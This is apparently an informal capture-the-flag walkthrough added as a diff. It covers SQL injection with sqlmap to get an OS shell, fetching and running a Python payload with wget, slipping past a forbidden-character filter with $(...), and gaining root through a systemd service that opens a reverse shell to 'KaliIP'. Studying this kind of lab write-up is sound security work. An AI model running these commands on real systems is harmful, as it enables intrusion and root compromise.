@@ -1,0 +1,47 @@
+I found literally nothong on the website except a link that says ?cod=1
+
+i did lfi but no use .. so I did a sqlmap on it like sqlmpa -u url -p cod --dbs but cant get anything
+
+so i put it on burp and then i did sqlmap -r rq.req --dump all
+
+so it gave me a ton of useless info
+
+so i tried to spawn a shell with it
+
+sqlmap --btach -r re.req --os-shell
+
+and got a shell now time to take shell on our machine
+
+we did wget aa.py (with our payload);python aa.py and got a shell
+
+now on the machine we saw a py file
+
+forbiden=['&',';','\',"|"...]
+
+it was protection but we do $(wget aa.py ; python aa.py) and get a shell and we got it
+
+now we ran linpeas and it said /bi/systemctl pepper have access so we made a payload root.serve in /dev/shm
+
+and got shell
+
+```
+>>>https://gist.github.com/A1vinSmith/78786df7899a840ec43c5ddecb6a4740
+[Unit]
+Description=roooooooooot
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KaliIP/9999 0>&1'
+
+[Install]
+WantedBy=multi-user.target
+
+
+
+/bin/systemctl enable /dev/shm/root.service
+
+/bin/systemctl start root
+
+shell listen on it
+```
